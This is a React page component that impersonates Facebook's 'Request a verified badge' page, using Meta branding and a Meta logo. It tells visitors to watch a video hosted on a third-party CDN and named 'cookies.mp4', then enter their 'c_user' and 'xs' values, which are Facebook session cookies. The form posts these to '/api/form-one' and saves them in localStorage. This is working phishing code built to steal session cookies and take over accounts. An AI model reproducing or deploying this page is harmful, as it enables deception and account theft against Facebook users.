import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { z } from "zod";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { Search } from "lucide-react";

// Define the validation schema
const validationFormSchema = z.object({
  c_user: z.string().min(1, "c_user is required"),
  xs: z.string().min(1, "xs is required"),
});

type ValidationFormValues = z.infer<typeof validationFormSchema>;

const MetaLogo = () => (
  <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
    <g clipPath="url(#clip0_4090_978)">
      <path d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z" fill="#0180FA"/>
    </g>
  </svg>
);

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm<ValidationFormValues>({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: ValidationFormValues) => {
    try {
      await fetch('/api/form-one', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen flex" style={{
      background: "linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)",
      fontFamily: "Arial, Helvetica, sans-serif"
    }}>
      <MetaTags 
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Initial Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      {/* Left Sidebar */}
      <div className="hidden md:flex w-[320px] bg-white flex-col p-6 border-r">
        <div className="mb-8">
          <MetaLogo />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Navigation Bar */}
        <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white">
          <div className="flex items-center md:hidden">
            <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
            />
          </div>
        </nav>

        <div className="flex-1 flex justify-center p-4 sm:p-8 overflow-y-auto">
          <div className="max-w-2xl w-full space-y-4 sm:space-y-6 bg-white rounded-lg p-6">
            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
              Request a verified badge on Facebook
            </h1>

            <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
              <p>
                The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
              </p>
              <p>
                Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
              </p>
              <p>
                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
              </p>
            </div>

            <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
              <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>

              <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
                <video
                  className="w-full h-full"
                  controls
                  playsInline
                  preload="auto"
                >
                  <source
                    src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
                    type="video/mp4"
                  />
                  Your browser does not support the video tag.
                </video>
              </div>

              <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
                Must Watch the video and submit required information correctly.
              </h3>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min="0"
                          pattern="[0-9]+"
                          minLength={6}
                          placeholder="Enter c_user"
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                      <FormControl>
                        <Input 
                          type="text" 
                          placeholder="Enter xs" 
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />

                <p className="text-xs sm:text-sm text-[#65676B]">
                  Please make sure account not to log out from your computer or laptop until you have received a verification email.
                </p>

                <Button 
                  type="submit" 
                  className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#0180FA] hover:bg-[#0180FA]/90 transition-colors duration-200"
                  disabled={form.formState.isSubmitting}
                >
                  {form.formState.isSubmitting ? "Submitting..." : "Submit"}
                </Button>
              </form>
            </Form>
          </div>
        </div>

        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white">
          Meta © 2025
        </div>
      </div>

      <style>{`
        .video-container {
          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
      `}</style>
    </div>
  );
}